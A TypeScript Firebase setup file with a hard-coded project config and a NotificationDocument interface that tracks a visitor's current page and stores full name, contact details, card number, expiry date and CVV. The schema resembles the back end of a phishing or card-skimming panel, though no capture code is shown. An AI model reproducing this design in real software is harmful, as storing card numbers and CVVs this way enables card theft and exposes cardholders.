import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';
import { getDatabase } from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyAfp_5EPAYllbSFDlQ4SP5eqJO7N701Q5s",
  authDomain: "cerewtanibn.firebaseapp.com",
  projectId: "cerewtanibn",
  storageBucket: "cerewtanibn.firebasestorage.app",
  messagingSenderId: "773983791233",
  appId: "1:773983791233:web:1b885716e5a72202f38580",
  measurementId: "G-771HSKQLVJ"

};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

